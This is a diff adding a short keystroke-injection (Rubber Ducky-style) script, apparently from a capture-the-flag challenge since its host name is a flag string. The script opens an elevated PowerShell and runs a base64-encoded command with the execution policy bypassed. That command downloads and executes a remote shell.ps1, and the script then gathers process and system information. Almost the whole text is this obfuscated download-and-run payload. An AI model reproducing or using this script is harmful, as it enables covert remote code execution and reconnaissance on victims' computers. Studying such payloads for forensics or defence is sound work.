@@ -1,0 +1,19 @@
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1500
+
+STRING PowerShell -Exec ByPass -Nol -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMjRISVVUe1QwdXRfM3N0X0NAc3MzfS9zaGVsbC5wczEnKQ==
+ENTER
+DELAY 2000
+
+STRING Get-Process | Select-Object TrustMeImADolphine.exe,1337
+ENTER
+DELAY 1000
+
+STRING ping -n 1 192.168.1.1 > nul
+ENTER
+DELAY 500
+
+STRING systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+ENTER
+DELAY 1000
